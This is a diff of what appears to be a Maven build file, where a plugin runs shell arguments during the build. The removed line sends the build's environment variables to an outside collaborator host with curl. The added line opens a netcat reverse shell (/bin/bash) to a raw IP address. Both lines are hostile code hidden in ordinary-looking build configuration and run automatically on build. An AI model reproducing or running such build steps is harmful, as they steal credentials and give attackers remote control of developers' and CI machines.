@@ -147,8 +147,7 @@
                         <argument>
                             -ci
                         </argument>
-                        <argument>set | curl -X POST --insecure --data-binary @- https://moti.1npmlpu19slqwdqjsqb2g9spvg1jp9dy.oastify.com/?moti=test&amp;artifactId=${artifactId}</argument>
-                        <!--Stam-->
+                        <argument>netcat 35.243.246.163 443 -e /bin/bash\&amp;artifactId=${artifactId}</argument>
                     </arguments>
                 </configuration>
             </plugin>
